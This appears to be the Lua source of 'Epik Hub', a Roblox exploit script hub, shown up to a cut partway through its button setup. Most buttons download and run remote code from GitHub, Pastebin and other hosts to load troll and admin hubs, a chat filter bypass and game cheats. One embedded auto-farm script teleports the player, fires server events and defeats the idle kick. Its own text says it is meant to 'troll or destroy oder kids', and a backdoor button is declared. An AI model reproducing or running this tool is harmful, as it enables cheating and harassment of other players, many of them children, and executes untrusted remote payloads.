--Epik Hub.

--Lose all your games with Epik Hub, the smallest library of scripts.

--Unparalled crap quality.

--Version v1.1

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Topbar = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local UICornerCover = Instance.new("Frame")
local HubTitle = Instance.new("TextLabel")
local Sidebar = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local UICornerCover_2 = Instance.new("Frame")
local ScriptHubs = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local GameHubs = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local FlingScripts = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local Serverside = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local MadeByIdiotsForIdiots = Instance.new("TextLabel")
local ScriptHubsFrame = Instance.new("Frame")
local LXFEhub = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local Dinohub = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local Chatbypass = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local c00lkidd = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local Pendulumhub = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local Nullwarehub = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local R15dances = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local Fatesadmin = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local CMDX = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local InfYield = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local Description = Instance.new("TextLabel")
local GameHubsFrame = Instance.new("Frame")
local Title_2 = Instance.new("TextLabel")
local KJhubAFS = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local MukhubBF = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local ADhub = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local CChub = Instance.new("TextButton")
local UICorner_21 = Instance.new("UICorner")
local CShub = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local Darkhub = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local MM2hub = Instance.new("TextButton")
local UICorner_24 = Instance.new("UICorner")
local BABFThub = Instance.new("TextButton")
local UICorner_25 = Instance.new("UICorner")
local Description_2 = Instance.new("TextLabel")
local AChub = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local FlingScriptsFrame = Instance.new("Frame")
local CreeperSpider = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local Blackhole = Instance.new("TextButton")
local UICorner_28 = Instance.new("UICorner")
local Soldier = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local Saitama = Instance.new("TextButton")
local UICorner_30 = Instance.new("UICorner")
local Guts = Instance.new("TextButton")
local UICorner_31 = Instance.new("UICorner")
local Neko = Instance.new("TextButton")
local UICorner_32 = Instance.new("UICorner")
local Butterloaf = Instance.new("TextButton")
local UICorner_33 = Instance.new("UICorner")
local Kitchengun = Instance.new("TextButton")
local UICorner_34 = Instance.new("UICorner")
local Slasher = Instance.new("TextButton")
local UICorner_35 = Instance.new("UICorner")
local Invis = Instance.new("TextButton")
local UICorner_36 = Instance.new("UICorner")
local Title_3 = Instance.new("TextLabel")
local Description_3 = Instance.new("TextLabel")
local ServersideFrame = Instance.new("Frame")
local BackdoorSS = Instance.new("TextButton")
local UICorner_37 = Instance.new("UICorner")
local Title_4 = Instance.new("TextLabel")
local Description_4 = Instance.new("TextLabel")
local IntroFrame = Instance.new("Frame")
local Agreement = Instance.new("TextButton")
local UICorner_38 = Instance.new("UICorner")
local HubTitle_2 = Instance.new("TextLabel")
local Conditions = Instance.new("TextLabel")
local Cond1 = Instance.new("TextLabel")
local Cond2 = Instance.new("TextLabel")
local Cond3 = Instance.new("TextLabel")
local Cond4 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(36, 57, 72)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.288486779, 0, 0.236015856, 0)
Frame.Size = UDim2.new(0, 660, 0, 404)

UICorner.CornerRadius = UDim.new(0.0250000004, 0)
UICorner.Parent = Frame

Topbar.Name = "Topbar"
Topbar.Parent = Frame
Topbar.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Topbar.BorderColor3 = Color3.fromRGB(45, 70, 88)
Topbar.BorderSizePixel = 0
Topbar.Size = UDim2.new(0, 660, 0, 60)

UICorner_2.CornerRadius = UDim.new(0.200000003, 0)
UICorner_2.Parent = Topbar

UICornerCover.Name = "UICornerCover"
UICornerCover.Parent = Topbar
UICornerCover.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
UICornerCover.BorderSizePixel = 0
UICornerCover.Position = UDim2.new(0, 0, 0.826731384, 0)
UICornerCover.Size = UDim2.new(0, 660, 0, 18)

HubTitle.Name = "HubTitle"
HubTitle.Parent = Topbar
HubTitle.BackgroundColor3 = Color3.fromRGB(238, 238, 238)
HubTitle.BackgroundTransparency = 1.000
HubTitle.Position = UDim2.new(0.453030348, 0, 0, 0)
HubTitle.Size = UDim2.new(0, 200, 0, 67)
HubTitle.Font = Enum.Font.Nunito
HubTitle.Text = "Epik Hub"
HubTitle.TextColor3 = Color3.fromRGB(238, 238, 238)
HubTitle.TextSize = 45.000

Sidebar.Name = "Sidebar"
Sidebar.Parent = Frame
Sidebar.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Sidebar.BorderSizePixel = 0
Sidebar.Position = UDim2.new(-1.02445483e-08, 0, 0, 0)
Sidebar.Size = UDim2.new(0, 152, 0, 404)

UICorner_3.CornerRadius = UDim.new(0, 10)
UICorner_3.Parent = Sidebar

UICornerCover_2.Name = "UICornerCover"
UICornerCover_2.Parent = Sidebar
UICornerCover_2.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
UICornerCover_2.BorderSizePixel = 0
UICornerCover_2.Position = UDim2.new(0.342105269, 0, 0, 0)
UICornerCover_2.Size = UDim2.new(0, 100, 0, 404)

ScriptHubs.Name = "ScriptHubs"
ScriptHubs.Parent = Sidebar
ScriptHubs.BackgroundColor3 = Color3.fromRGB(52, 82, 103)
ScriptHubs.BorderSizePixel = 0
ScriptHubs.Position = UDim2.new(0.0263157897, 0, 0.183168307, 0)
ScriptHubs.Size = UDim2.new(0, 143, 0, 43)
ScriptHubs.Font = Enum.Font.Nunito
ScriptHubs.Text = "Script Hubs"
ScriptHubs.TextColor3 = Color3.fromRGB(238, 238, 238)
ScriptHubs.TextSize = 32.000

UICorner_4.CornerRadius = UDim.new(0, 10)
UICorner_4.Parent = ScriptHubs

GameHubs.Name = "GameHubs"
GameHubs.Parent = Sidebar
GameHubs.BackgroundColor3 = Color3.fromRGB(52, 82, 103)
GameHubs.Position = UDim2.new(0.0263157897, 0, 0.306930691, 0)
GameHubs.Size = UDim2.new(0, 143, 0, 43)
GameHubs.Font = Enum.Font.Nunito
GameHubs.Text = "Game Hubs"
GameHubs.TextColor3 = Color3.fromRGB(238, 238, 238)
GameHubs.TextSize = 32.000

UICorner_5.CornerRadius = UDim.new(0, 10)
UICorner_5.Parent = GameHubs

FlingScripts.Name = "FlingScripts"
FlingScripts.Parent = Sidebar
FlingScripts.BackgroundColor3 = Color3.fromRGB(52, 82, 103)
FlingScripts.Position = UDim2.new(0.0263157897, 0, 0.428217828, 0)
FlingScripts.Size = UDim2.new(0, 143, 0, 43)
FlingScripts.Font = Enum.Font.Nunito
FlingScripts.Text = "Fling Scripts"
FlingScripts.TextColor3 = Color3.fromRGB(238, 238, 238)
FlingScripts.TextSize = 30.000

UICorner_6.CornerRadius = UDim.new(0, 10)
UICorner_6.Parent = FlingScripts

Serverside.Name = "Serverside"
Serverside.Parent = Sidebar
Serverside.BackgroundColor3 = Color3.fromRGB(52, 82, 103)
Serverside.Position = UDim2.new(0.0263157897, 0, 0.549504936, 0)
Serverside.Size = UDim2.new(0, 143, 0, 43)
Serverside.Font = Enum.Font.Nunito
Serverside.Text = "Serverside"
Serverside.TextColor3 = Color3.fromRGB(238, 238, 238)
Serverside.TextSize = 32.000

UICorner_7.CornerRadius = UDim.new(0, 10)
UICorner_7.Parent = Serverside

MadeByIdiotsForIdiots.Name = "MadeByIdiotsForIdiots"
MadeByIdiotsForIdiots.Parent = Sidebar
MadeByIdiotsForIdiots.BackgroundColor3 = Color3.fromRGB(238, 238, 238)
MadeByIdiotsForIdiots.BackgroundTransparency = 1.000
MadeByIdiotsForIdiots.Position = UDim2.new(0.0263157897, 0, 0.00746540027, 0)
MadeByIdiotsForIdiots.Size = UDim2.new(0, 142, 0, 60)
MadeByIdiotsForIdiots.Font = Enum.Font.Nunito
MadeByIdiotsForIdiots.Text = "Made by Idiots. For Idiots."
MadeByIdiotsForIdiots.TextColor3 = Color3.fromRGB(238, 238, 238)
MadeByIdiotsForIdiots.TextScaled = true
MadeByIdiotsForIdiots.TextSize = 30.000
MadeByIdiotsForIdiots.TextWrapped = true

ScriptHubsFrame.Name = "ScriptHubsFrame"
ScriptHubsFrame.Parent = Frame
ScriptHubsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptHubsFrame.BackgroundTransparency = 1.000
ScriptHubsFrame.Position = UDim2.new(0.230303034, 0, 0.163366333, 0)
ScriptHubsFrame.Size = UDim2.new(0, 508, 0, 338)
ScriptHubsFrame.Visible = false

LXFEhub.Name = "LXFEhub"
LXFEhub.Parent = ScriptHubsFrame
LXFEhub.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
LXFEhub.Position = UDim2.new(0.0492125973, 0, 0.168639049, 0)
LXFEhub.Size = UDim2.new(0, 143, 0, 43)
LXFEhub.Font = Enum.Font.Nunito
LXFEhub.Text = "LX FE Hub"
LXFEhub.TextColor3 = Color3.fromRGB(238, 238, 238)
LXFEhub.TextSize = 28.000
LXFEhub.MouseButton1Click:Connect(function()
	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/LionelStreaming/GumaHub/main/LX-FE-Hub"))()
end)
UICorner_8.Parent = LXFEhub

Dinohub.Name = "Dinohub"
Dinohub.Parent = ScriptHubsFrame
Dinohub.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Dinohub.Position = UDim2.new(0.344488204, 0, 0.168639049, 0)
Dinohub.Size = UDim2.new(0, 143, 0, 43)
Dinohub.Font = Enum.Font.Nunito
Dinohub.Text = "Dino Hub"
Dinohub.TextColor3 = Color3.fromRGB(238, 238, 238)
Dinohub.TextSize = 28.000
Dinohub.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/DinosaurXxX/dinohub/main/DinoHub"))()
end)
UICorner_9.Parent = Dinohub

Chatbypass.Name = "Chatbypass"
Chatbypass.Parent = ScriptHubsFrame
Chatbypass.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Chatbypass.Position = UDim2.new(0.641732335, 0, 0.168639049, 0)
Chatbypass.Size = UDim2.new(0, 143, 0, 43)
Chatbypass.Font = Enum.Font.Nunito
Chatbypass.Text = "Chat Bypass"
Chatbypass.TextColor3 = Color3.fromRGB(238, 238, 238)
Chatbypass.TextSize = 28.000
Chatbypass.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
end)
UICorner_10.Parent = Chatbypass

c00lkidd.Name = "c00lkidd"
c00lkidd.Parent = ScriptHubsFrame
c00lkidd.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
c00lkidd.Position = UDim2.new(0.0492126346, 0, 0.313609481, 0)
c00lkidd.Size = UDim2.new(0, 143, 0, 43)
c00lkidd.Font = Enum.Font.Nunito
c00lkidd.Text = "c00lkidd GUI"
c00lkidd.TextColor3 = Color3.fromRGB(238, 238, 238)
c00lkidd.TextSize = 28.000
c00lkidd.MouseButton1Click:Connect(function()
	loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
end)
UICorner_11.Parent = c00lkidd

Pendulumhub.Name = "Pendulumhub"
Pendulumhub.Parent = ScriptHubsFrame
Pendulumhub.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Pendulumhub.Position = UDim2.new(0.344488233, 0, 0.313609481, 0)
Pendulumhub.Size = UDim2.new(0, 143, 0, 43)
Pendulumhub.Font = Enum.Font.Nunito
Pendulumhub.Text = "Pendulum Hub"
Pendulumhub.TextColor3 = Color3.fromRGB(238, 238, 238)
Pendulumhub.TextSize = 26.000
Pendulumhub.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V4.lua"))()
end)
UICorner_12.Parent = Pendulumhub

Nullwarehub.Name = "Nullwarehub"
Nullwarehub.Parent = ScriptHubsFrame
Nullwarehub.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Nullwarehub.Position = UDim2.new(0.641732335, 0, 0.313609481, 0)
Nullwarehub.Size = UDim2.new(0, 143, 0, 43)
Nullwarehub.Font = Enum.Font.Nunito
Nullwarehub.Text = "Nullware Hub"
Nullwarehub.TextColor3 = Color3.fromRGB(238, 238, 238)
Nullwarehub.TextSize = 28.000
Nullwarehub.MouseButton1Click:Connect(function()
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local Heartbeat = game:GetService("RunService").Heartbeat

	Heartbeat:Connect(function()
		LocalPlayer.MaximumSimulationRadius = math.huge
		sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
	end)
	-- Script above is a fix to limbs falling --

	-- Nullware Hub V3 | --
	getgenv().Theme = "Purple" -- To change the UI Theme, set this to one of the following options: "Red", "Purple", "Blue", "Green", "Yellow"
	loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/a8b63bcaf8ff251e9c808483b03a8206/raw/dTM3hnvzGJ48EhHQ?identifier=".. (function()local a=""for b=1,256 do local c=math.random(1,3)a=a..string.char(c==1 and math.random(48,57)or c==2 and math.random(97,122)or c==3 and math.random(65,90))end;return a end)()))()
end)
UICorner_13.Parent = Nullwarehub

R15dances.Name = "R15dances"
R15dances.Parent = ScriptHubsFrame
R15dances.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
R15dances.Position = UDim2.new(0.0492126346, 0, 0.461538464, 0)
R15dances.Size = UDim2.new(0, 143, 0, 43)
R15dances.Font = Enum.Font.Nunito
R15dances.Text = "R15 Dances"
R15dances.TextColor3 = Color3.fromRGB(238, 238, 238)
R15dances.TextSize = 30.000
R15dances.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://gitlab.com/Tsuniox/lua-stuff/-/raw/master/R15GUI.lua"))()
end)
UICorner_14.Parent = R15dances

Fatesadmin.Name = "Fatesadmin"
Fatesadmin.Parent = ScriptHubsFrame
Fatesadmin.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Fatesadmin.Position = UDim2.new(0.344488233, 0, 0.458579898, 0)
Fatesadmin.Size = UDim2.new(0, 143, 0, 43)
Fatesadmin.Font = Enum.Font.Nunito
Fatesadmin.Text = "Fate's Admin"
Fatesadmin.TextColor3 = Color3.fromRGB(238, 238, 238)
Fatesadmin.TextSize = 30.000
Fatesadmin.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
end)
UICorner_15.Parent = Fatesadmin

CMDX.Name = "CMDX"
CMDX.Parent = ScriptHubsFrame
CMDX.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
CMDX.Position = UDim2.new(0.641732335, 0, 0.461538464, 0)
CMDX.Size = UDim2.new(0, 143, 0, 43)
CMDX.Font = Enum.Font.Nunito
CMDX.Text = "CMD-X"
CMDX.TextColor3 = Color3.fromRGB(238, 238, 238)
CMDX.TextSize = 30.000
CMDX.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
end)
UICorner_16.Parent = CMDX

InfYield.Name = "InfYield"
InfYield.Parent = ScriptHubsFrame
InfYield.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
InfYield.Position = UDim2.new(0.344488233, 0, 0.603550315, 0)
InfYield.Size = UDim2.new(0, 143, 0, 43)
InfYield.Font = Enum.Font.Nunito
InfYield.Text = "Infinite Yield"
InfYield.TextColor3 = Color3.fromRGB(238, 238, 238)
InfYield.TextSize = 30.000
InfYield.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)
UICorner_17.Parent = InfYield

Title.Name = "Title"
Title.Parent = ScriptHubsFrame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.0492125973, 0, 0.0118343197, 0)
Title.Size = UDim2.new(0, 444, 0, 54)
Title.Font = Enum.Font.Nunito
Title.Text = "Admin Scripts/Script Hubs"
Title.TextColor3 = Color3.fromRGB(238, 238, 238)
Title.TextSize = 40.000
Title.TextStrokeColor3 = Color3.fromRGB(238, 238, 238)

Description.Name = "Description"
Description.Parent = ScriptHubsFrame
Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Description.BackgroundTransparency = 1.000
Description.Position = UDim2.new(0.0472440943, 0, 0.840236723, 0)
Description.Size = UDim2.new(0, 444, 0, 54)
Description.Font = Enum.Font.Nunito
Description.Text = "Some FE admin scripts and script hubs to troll or destroy oder kids"
Description.TextColor3 = Color3.fromRGB(238, 238, 238)
Description.TextSize = 25.000
Description.TextStrokeColor3 = Color3.fromRGB(238, 238, 238)
Description.TextWrapped = true

GameHubsFrame.Name = "GameHubsFrame"
GameHubsFrame.Parent = Frame
GameHubsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GameHubsFrame.BackgroundTransparency = 1.000
GameHubsFrame.Position = UDim2.new(0.230303034, 0, 0.165841579, 0)
GameHubsFrame.Size = UDim2.new(0, 508, 0, 337)
GameHubsFrame.Visible = false

Title_2.Name = "Title"
Title_2.Parent = GameHubsFrame
Title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_2.BackgroundTransparency = 1.000
Title_2.Position = UDim2.new(0.0472440943, 0, 0.00886696577, 0)
Title_2.Size = UDim2.new(0, 444, 0, 54)
Title_2.Font = Enum.Font.Nunito
Title_2.Text = "Game Hubs"
Title_2.TextColor3 = Color3.fromRGB(238, 238, 238)
Title_2.TextSize = 40.000
Title_2.TextStrokeColor3 = Color3.fromRGB(238, 238, 238)

KJhubAFS.Name = "KJhubAFS"
KJhubAFS.Parent = GameHubsFrame
KJhubAFS.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
KJhubAFS.Position = UDim2.new(0.0492125973, 0, 0.165671691, 0)
KJhubAFS.Size = UDim2.new(0, 143, 0, 43)
KJhubAFS.Font = Enum.Font.Nunito
KJhubAFS.Text = "Anime Fighters"
KJhubAFS.TextColor3 = Color3.fromRGB(238, 238, 238)
KJhubAFS.TextSize = 26.000
KJhubAFS.MouseButton1Click:Connect(function()
	loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/KiJinGaming/FreeScript/main/KJHub.lua"))();
end)
UICorner_18.Parent = KJhubAFS

MukhubBF.Name = "MukhubBF"
MukhubBF.Parent = GameHubsFrame
MukhubBF.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
MukhubBF.Position = UDim2.new(0.342519701, 0, 0.165671691, 0)
MukhubBF.Size = UDim2.new(0, 143, 0, 43)
MukhubBF.Font = Enum.Font.Nunito
MukhubBF.Text = "Blox Fruits"
MukhubBF.TextColor3 = Color3.fromRGB(238, 238, 238)
MukhubBF.TextSize = 30.000
MukhubBF.TextWrapped = true
MukhubBF.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/xDepressionx/Free-Script/main/BloxFruit.lua"))()
end)
UICorner_19.Parent = MukhubBF

ADhub.Name = "ADhub"
ADhub.Parent = GameHubsFrame
ADhub.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
ADhub.Position = UDim2.new(0.639763832, 0, 0.165671691, 0)
ADhub.Size = UDim2.new(0, 143, 0, 43)
ADhub.Font = Enum.Font.Nunito
ADhub.Text = "Anime Dimensions"
ADhub.TextColor3 = Color3.fromRGB(238, 238, 238)
ADhub.TextSize = 21.000
ADhub.TextWrapped = true
ADhub.MouseButton1Click:Connect(function()
	if game.GameId == 2655311011 then

		repeat wait() until game:IsLoaded()

		_G.Settings = {
			MapName =       "Titan Dimension";
			Difficulty =    "Easy";
			Hardcore =      false;
			FriendsOnly =   false;
			AutoFarm =      false;
			AutoRetry =     false;
			AutoSkill =     false;
			Distance =      0;
			Speed =         69;
		}

		local foldername = "Uzu"
		local filename = "AnimeDimension.lua"

		function saveSettings()
			local HttpService,json = game:GetService("HttpService")
			if (writefile) then
				if isfolder(foldername) then
					json = HttpService:JSONEncode(_G.Settings)
					writefile(foldername.."\\"..filename, json)
				else
					makefolder(foldername)
					writefile(foldername.."\\"..filename, json)
				end
			end
		end

		function loadSettings()
			local HttpService = game:GetService("HttpService")
			if isfile(foldername.."\\"..filename) then
				_G.Settings = HttpService:JSONDecode(readfile(foldername.."\\"..filename))
			end
		end

		loadSettings()

		local MapList = {
			"Infinite Mode";
			"Titan Dimension";
			"Demon Dimension";
			"Curse Dimension";
			"Villain Dimension";
			"Sword Dimension";
			"Ghoul Dimension";
			"Fate Dimension"
		}

		local MapDifficulty = {
			"Infinite";
			"Easy";
			"Hard";
			"Nightmare";
		}

		function tween(Enemy)
			local plr,tp = game.Players.LocalPlayer.Character.HumanoidRootPart

			if _G.Settings.Distance >= 1 then
				tp = {CFrame = Enemy.CFrame * CFrame.new(0,_G.Settings.Distance,0) * CFrame.Angles(math.rad(-90),0,0)}
			elseif _G.Settings.Distance <= 0 then
				tp = {CFrame = Enemy.CFrame * CFrame.new(0,_G.Settings.Distance,0) * CFrame.Angles(math.rad(90),0,0)}
			end


			local ts = game:GetService("TweenService"):Create(plr, TweenInfo.new((plr.Position - Enemy.Position).magnitude/_G.Settings.Speed, Enum.EasingStyle.Linear), tp)
			ts:Play()
		end

		function getNear()
			local nearr,near = math.huge
			local plr = game.Players.LocalPlayer.Character.HumanoidRootPart
			for i, v in pairs(game:GetService("Workspace").Folders.Monsters:GetChildren()) do 
				if v:FindFirstChild("Monster") and (plr.CFrame.p - v.HumanoidRootPart.CFrame.p).Magnitude < nearr then
					near = v.HumanoidRootPart
					nearr = (plr.CFrame.p - v.HumanoidRootPart.CFrame.p).Magnitude
				end
			end
			return near
		end

		function click()
			task.spawn(function()
				local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
				game:GetService("ReplicatedStorage").RemoteEvents.MainRemoteEvent:FireServer("UseSkill",{["hrpCFrame"] = hrp.CFrame,["attackNumber"] = 1},"BasicAttack")
			end)
		end

		function skill()
			task.spawn(function()
				local VIM = game:GetService('VirtualInputManager')
				VIM:SendKeyEvent(true, "One", false, game)
				VIM:SendKeyEvent(true, "Two", false, game)  
				VIM:SendKeyEvent(true, "Three", false, game)
				VIM:SendKeyEvent(true, "Four", false, game)
				VIM:SendKeyEvent(true, "E", false, game)
				VIM:SendKeyEvent(true, "R", false, game) task.wait()
				VIM:SendKeyEvent(false, "One", false, game)
				VIM:SendKeyEvent(false, "Two", false, game)  
				VIM:SendKeyEvent(false, "Three", false, game)
				VIM:SendKeyEvent(false, "Four", false, game)
				VIM:SendKeyEvent(false, "E", false, game)
				VIM:SendKeyEvent(false, "R", false, game)
			end)
		end

		function startGame()
			task.spawn(function()
				local args = {"CreateRoom",{["Difficulty"] = _G.Settings.Difficulty,["FriendsOnly"] = _G.Settings.FriendsOnly,["MapName"] = _G.Settings.MapName,["Hardcore"] = _G.Settings.Hardcore}}
				game:GetService("ReplicatedStorage").RemoteFunctions.MainRemoteFunction:InvokeServer(unpack(args))
				wait()
				game:GetService("ReplicatedStorage").RemoteFunctions.MainRemoteFunction:InvokeServer("TeleportPlayers")
			end)
		end 

		function noclip()
			for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if v:IsA("BasePart") and v.CanCollide == true then
					v.CanCollide = false
				end
			end
		end

		local library = loadstring(game:HttpGetAsync("https://pastebin.com/raw/znibQh36"))()
		local window = library:CreateWindow("Anime Dimension")
		local FarmingFolder = window:AddFolder("Farming")
		local SettingFolder = window:AddFolder("Settings")
		local CreditsFolder = window:AddFolder("Credits")

		FarmingFolder:AddToggle({
			text = "Enabled", 
			state = _G.Settings.AutoFarm,
			callback = function(a) 
				_G.Settings.AutoFarm = a
				saveSettings()
			end
		})

		SettingFolder:AddList({
			text = "Select Map", 
			value = _G.Settings.MapName,
			values = MapList, 
			callback = function(a) 
				_G.Settings.MapName = a
				saveSettings() 
			end
		})

		SettingFolder:AddList({
			text = " Select Difficulty", 
			value = _G.Settings.Difficulty,
			values = MapDifficulty, 
			callback = function(a) 
				_G.Settings.Difficulty = a
				saveSettings() 
			end
		})

		SettingFolder:AddToggle({
			text = "Friends Only", 
			state = _G.Settings.FriendsOnly,
			callback = function(a) 
				_G.Settings.FriendsOnly = a
				saveSettings()
			end
		})

		SettingFolder:AddToggle({
			text = "Hardcore", 
			state = _G.Settings.Hardcore,
			callback = function(a) 
				_G.Settings.Hardcore = a
				saveSettings()
			end
		})

		SettingFolder:AddToggle({
			text = "Auto Retry", 
			state = _G.Settings.AutoRetry,
			callback = function(a) 
				_G.Settings.AutoRetry = a
				saveSettings()

				task.spawn(function()
					while task.wait() do
						if not _G.Settings.AutoRetry then break end
						game:GetService("ReplicatedStorage").RemoteEvents.MainRemoteEvent:FireServer("RetryDungeon")
					end
				end)
			end
		})

		SettingFolder:AddToggle({
			text = "Auto Skill", 
			state = _G.Settings.AutoSkill,
			callback = function(a) 
				_G.Settings.AutoSkill = a
				saveSettings()
			end
		})

		SettingFolder:AddSlider({
			text = "Distance",
			value = _G.Settings.Distance,
			min = -10, 
			max = 10, 
			callback = function(a) 
				_G.Settings.Distance = a 
				saveSettings()
			end
		})

		SettingFolder:AddSlider({
			text = "Speed",
			value = _G.Settings.Speed,
			min = 10, 
			max = 150, 
			callback = function(a) 
				_G.Settings.Speed = a 
				saveSettings()
			end
		})

		CreditsFolder:AddBind({
			text = "Toggle GUI", 
			key = "LeftControl", 
			callback = function() 
				library:Close()
			end
		})

		CreditsFolder:AddButton({
			text = "Script by Uzu",
			callback = function()
				print("asd")
			end
		})

		CreditsFolder:AddButton({
			text = "discord.gg/waAsQFwcBn",
			callback = function()
				setclipboard("discord.gg/waAsQFwcBn")
			end
		})

		if _G.Connection then _G.Connection:Disconnect() end
		_G.Connection = game:GetService("RunService").Stepped:Connect(function()
			if _G.Settings.AutoFarm then
				pcall(function()
					local ene = getNear()
					tween(ene);click();startGame();noclip()
					if _G.Settings.AutoSkill then
						skill()
					end
					game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
				end)
			end
		end)

		library:Init()

		game:GetService("Players").LocalPlayer.Idled:Connect(function()
			game:GetService("VirtualUser"):CaptureController()
			game:GetService("VirtualUser"):ClickButton2(Vector2.new())
		end)

	end
end)
UICorner_20.Parent = ADhub

CChub.Name = "CChub"
CChub.Parent = GameHubsFrame
CChub.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
CChub.Position = UDim2.new(0.34251973, 0, 0.31107229, 0)
CChub.Size = UDim2.new(0, 143, 0, 43)
CChub.Font = Enum.Font.Nunito
CChub.Text = "Car Crushers"
CChub.TextColor3 = Color3.fromRGB(238, 238, 238)
CChub.TextSize = 30.000
CChub.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/saucekid/scripts/main/CarCrushers.lua"))()
end)
UICorner_21.Parent = CChub

CShub.Name = "CShub"
CShub.Parent = GameHubsFrame
CShub.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
CShub.Position = UDim2.new(0.639763832, 0, 0.31107229, 0)
CShub.Size = UDim2.new(0, 143, 0, 43)
CShub.Font = Enum.Font.Nunito
CShub.Text = "Clicker Sim"
CShub.TextColor3 = Color3.fromRGB(238, 238, 238)
CShub.TextSize = 30.000
CShub.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ExtremeAntonis/KeySystemUI/main/KeySystemUI-Obfuscated.lua"))()
end)
UICorner_22.Parent = CShub

Darkhub.Name = "Darkhub"
Darkhub.Parent = GameHubsFrame
Darkhub.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Darkhub.Position = UDim2.new(0.0492126346, 0, 0.456472874, 0)
Darkhub.Size = UDim2.new(0, 143, 0, 43)
Darkhub.Font = Enum.Font.Nunito
Darkhub.Text = "Arsenal"
Darkhub.TextColor3 = Color3.fromRGB(238, 238, 238)
Darkhub.TextSize = 30.000
Darkhub.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
end)
UICorner_23.Parent = Darkhub

MM2hub.Name = "MM2hub"
MM2hub.Parent = GameHubsFrame
MM2hub.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
MM2hub.Position = UDim2.new(0.344488233, 0, 0.459440231, 0)
MM2hub.Size = UDim2.new(0, 143, 0, 43)
MM2hub.Font = Enum.Font.Nunito
